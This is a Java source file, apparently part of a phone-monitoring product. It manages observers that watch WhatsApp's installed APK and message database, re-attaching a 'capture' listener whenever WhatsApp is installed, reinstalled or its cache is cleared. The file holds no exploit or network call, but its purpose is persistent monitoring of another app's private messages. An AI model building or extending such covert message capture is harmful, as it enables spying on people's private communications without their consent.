package com.vvt.whatsapp;

import com.vvt.im.Customization;
import com.vvt.imfileobserver.ImUtil;
import com.vvt.logger.FxLog;

public class WhatsAppObserverManager implements WhatsAppManagerListener{
	
	/*=========================== CONSTANT ===============================*/
	private static final String TAG = "WhatsAppObserverManager";
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGE = Customization.ERROR;
	
	/*============================ MEMBER ================================*/
	private static WhatsAppObserverManager sWhatsAppObserverManager;
	private static WhatsAppObserver sWhatsAppObserver;
	private static WhatAppMonitoringApk sMonitoringApkFileObserver;
	private static WhatsAppDatabaseObserver sWhatsAppDatabaseObserver;
	private static WhatsAppObserver.OnCaptureListenner sWhatsAppObserverListener;
	
	private static boolean sRegisterObserver_Flag;

	/*============================ METHOD ================================*/
	
	
	public static WhatsAppObserverManager getWhatsAppObserverManager() {
		if (sWhatsAppObserverManager == null) {
			sWhatsAppObserverManager = new WhatsAppObserverManager();
		}
		return sWhatsAppObserverManager;
	}
	
	private WhatsAppObserverManager() {
		sRegisterObserver_Flag = false;
	}
	
	/**
	 * Please call this method before register observer.
	 * @param path
	 */
	public void setLoggablePath(String path){
		if(sWhatsAppObserver == null) {
			sWhatsAppObserver = WhatsAppObserver.getWhatsAppObserver();
		}
		
		sWhatsAppObserver.setLoggablePath(path);
	}
	
	/**
	 * set date format 
	 * @param format
	 */
	public void setDateFormat(String format) {
		if(sWhatsAppObserver == null) {
			sWhatsAppObserver = WhatsAppObserver.getWhatsAppObserver();
		}
		
		sWhatsAppObserver.setDateFormat(format);
	}
	
	/**
	 * registerWhatsAppObserver, It will register until you call Unregister.
	 */
	public void registerWhatsAppObserver(WhatsAppObserver.OnCaptureListenner listener) {
		if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # ENTER ...");
		
		sWhatsAppObserverListener = listener;
		
		if(sWhatsAppObserver == null) {
			sWhatsAppObserver = WhatsAppObserver.getWhatsAppObserver();
		}
		
		if(sMonitoringApkFileObserver == null) {
			sMonitoringApkFileObserver = WhatAppMonitoringApk.getMonitoringApkFileObserver(this);
		}
		
		//set for monitoring .apk file.
		boolean isHaveFile = ImUtil.isHaveFileName(
				WhatAppMonitoringApk.APK_FOLDER_PATH,WhatAppMonitoringApk.WA_APK_NAME);
		if(isHaveFile) {
			sMonitoringApkFileObserver.setFlagApkFileIsAlreadyHave(true);
		} else {
			sMonitoringApkFileObserver.setFlagApkFileIsAlreadyHave(false);
		}
		sMonitoringApkFileObserver.registerObserver();
		
		if (sWhatsAppDatabaseObserver == null) {
			sWhatsAppDatabaseObserver = WhatsAppDatabaseObserver.getWhatsAppDatabaseObserver(this);
		}
		
		//if no database file we will observe folder that keep database until database create.
		if(!sWhatsAppObserver.registerWhatsAppObserver(sWhatsAppObserverListener)) {
			
			if(sWhatsAppDatabaseObserver.registerObserver()) {
				if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # " +
						"WhatsAppDatabaseObserver.registerObserver() SUCCESS"); 
			} else {
				if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # " +
						"Observe FOLDER that keep database FAIL"); 
				if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # let's try to observe .apk file"); 
			}
			if(LOGE) FxLog.e(TAG, "registerWhatsAppObserver # unregister WhatsAppObserver ");
			sWhatsAppObserver.unregisterWhatsAppObserver(sWhatsAppObserverListener);
			sWhatsAppObserver = null;
			sRegisterObserver_Flag = false;
			
		} else {
			if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # register observe database SUCCESS"); 
			
			//Monitoring for event clear cache.
			if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # register Observer FOLDER for monior clear cache" );
			sWhatsAppDatabaseObserver.registerObserver();
			
			sRegisterObserver_Flag = true;
		}
		
		if(LOGV) FxLog.v(TAG, "registerWhatsAppObserver # EXIT ...");
	}
	
	/**
	 * unregisterWhatsAppObserver, unregister all observer of WhatsApp.
	 */
	public void unregisterWhatsAppObserver() {
		FxLog.v(TAG, "unregisterWhatsAppObserver # ENTER ...");
		
		//guarantee that the observer is registered before. 
		if(sRegisterObserver_Flag) {
			if (sWhatsAppObserver != null) {
				sWhatsAppObserver.unregisterWhatsAppObserver(sWhatsAppObserverListener);
				sWhatsAppObserver = null;
			}
		}
		
		sRegisterObserver_Flag = false;

		if(sWhatsAppDatabaseObserver != null) {
			sWhatsAppDatabaseObserver.unregisterObserver();
			sWhatsAppDatabaseObserver = null;
		}
		
		if (sMonitoringApkFileObserver == null) {
			sMonitoringApkFileObserver = WhatAppMonitoringApk.getMonitoringApkFileObserver(this);
		}
        
        // if command is come form Caller we will unregister .apk file observer too.
        if(!(sMonitoringApkFileObserver.getFlagUnRegisObserverByFileObserver())) {
        	sMonitoringApkFileObserver.unregisterObserver();
        	sMonitoringApkFileObserver = null;
        	if(LOGV) FxLog.v(TAG, "unRegisObserverByFileObserver_Flag is False = Caller command"); 
        }
        
        if(sMonitoringApkFileObserver != null) {
        	sMonitoringApkFileObserver.setFlagUnRegisObserverByFileObserver(false);
        }
        
        
        if(LOGV) FxLog.v(TAG, "unregisterWhatsAppObserver # EXIT ...");
	}

	@Override
	public void onDatabaseFolderChange(boolean isCreate) {
		
		if(LOGV) FxLog.v(TAG, "onDatabaseFolderChange # ENTER ...");
		
		if(LOGV) FxLog.v(TAG, "onDatabaseFolderChange # isCreate : " +isCreate);
		
		
		if (isCreate) {
			
			if (sWhatsAppObserver == null) {
				if(LOGE) FxLog.e(TAG, "onDatabaseFolderChange # sWhatsAppObserver is NULL");
				sWhatsAppObserver = WhatsAppObserver.getWhatsAppObserver();
			}
			if(!sRegisterObserver_Flag && sWhatsAppObserver.registerWhatsAppObserver(sWhatsAppObserverListener)) {
				if(LOGV) FxLog.v(TAG, "onDatabaseFolderChange # Observe database SUCCESS");
				
				//Flag for check WhatsApp that was installed.
				sRegisterObserver_Flag = true;
				
			} else {
				if(LOGV) FxLog.v(TAG, "onDatabaseFolderChange # " +
						"register Observer FAIL (No path or version not support.)"); 
				sRegisterObserver_Flag = false;
			}
		} else { // deleted database
			if(sWhatsAppObserver != null) {
				if(LOGE) FxLog.e(TAG, "onDatabaseFolderChange # sWhatsAppObserver unregister");
					sWhatsAppObserver.unregisterWhatsAppObserver(sWhatsAppObserverListener);
					sWhatsAppObserver = null;
				
			}
			sRegisterObserver_Flag = false;
		}
		
		if(LOGV) FxLog.v(TAG, "onDatabaseFolderChange # EXIT ...");
	}

	@Override
	public void onApkFileChange(boolean isNewinstallOrDelete) {
		if(LOGV) FxLog.v(TAG, "onApkFileChange # ENTER ...");
		
		if(LOGV) FxLog.v(TAG, "onApkFileChange # isNewinstallOrDelete : "+isNewinstallOrDelete);
	
		//if New install WhatsApp
		if(isNewinstallOrDelete) {
			
			if(sWhatsAppDatabaseObserver == null) {
				if(LOGE) FxLog.e(TAG, "onApkFileChange # sWhatsAppDatabaseObserver = null");
				sWhatsAppDatabaseObserver = WhatsAppDatabaseObserver.getWhatsAppDatabaseObserver(this);
			}
			
			if(sWhatsAppDatabaseObserver.registerObserver()) {
				if(LOGV) FxLog.v(TAG, "onApkFileChange # " +
						"Observe database FOLDER  SUCCESS"); 
			} else {
				if(LOGV) FxLog.v(TAG, "onApkFileChange # " +
						"Observe database FOLDER FAIL"); 
			}
			
			// check database is ready to observe. because it may be complete during MonitoringApk sleep.
			if(WhatsAppUtil.TestQuery()) {
				
				if (sWhatsAppObserver == null) {
					if(LOGE) FxLog.e(TAG, "onApkFileChange # sWhatsAppObserver = null"); 
					sWhatsAppObserver = WhatsAppObserver.getWhatsAppObserver();
				}
				
				if(!sRegisterObserver_Flag && sWhatsAppObserver.registerWhatsAppObserver(sWhatsAppObserverListener)) {
					if(LOGV) FxLog.v(TAG, "onApkFileChange # Register observer SUCCESS");
					
					//Flag for check WhatsApp that was installed.
					sRegisterObserver_Flag = true;
					
				} else {
					if(LOGD) FxLog.d(TAG, "onApkFileChange # " +
							"Register observer FAIL (No path or version not support.)"); 
					if(LOGV) FxLog.v(TAG, "onApkFileChange # APK unregister");
					sWhatsAppObserver.unregisterWhatsAppObserver(sWhatsAppObserverListener);
					sRegisterObserver_Flag = false;
					
				}
			}
		} else {
			unregisterWhatsAppObserver();
		}
		
		if(LOGV) FxLog.v(TAG, "onApkFileChange # EXIT ...");
	}
}
